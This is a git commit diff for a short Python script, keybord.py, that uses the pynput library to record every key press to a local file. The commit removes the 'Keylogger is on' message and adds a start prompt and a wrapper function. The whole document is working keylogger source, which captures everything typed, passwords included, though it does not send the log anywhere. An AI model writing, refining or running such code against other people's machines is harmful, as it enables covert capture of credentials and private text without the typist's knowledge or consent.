abfcbddea52b73970d7f444a57ffab56e2d7233f
TechnoCraftX <bibekanandapramanik62@gmail.com>
2025-05-29 21:18:35 +0530

    Update

--- keybord.py
+++ keybord.py
@@ -1,16 +1,24 @@
 from pynput.keyboard import Listener
-print("Keylogger is on")
+
 def log_key(key):
     try:
         with open("keyhis","a")as f:
             f.write(f"{key}\n")
     except:
        pass
-try:
+   
+def keyloger():    
+    try:
     
-     with Listener(on_press=log_key) as a:
-         a.join()
-except KeyboardInterrupt:
-    print("Listener stopped by user")
-except :
+        with Listener(on_press=log_key) as a:
+            a.join()
+    except KeyboardInterrupt:
+        print("Listener stopped by user")
+    except :
         pass    
+n=input("Enter S to start: ").strip().upper()
+
+if n=='S':
+    keyloger()
+else:
+    print("Cannot start")  
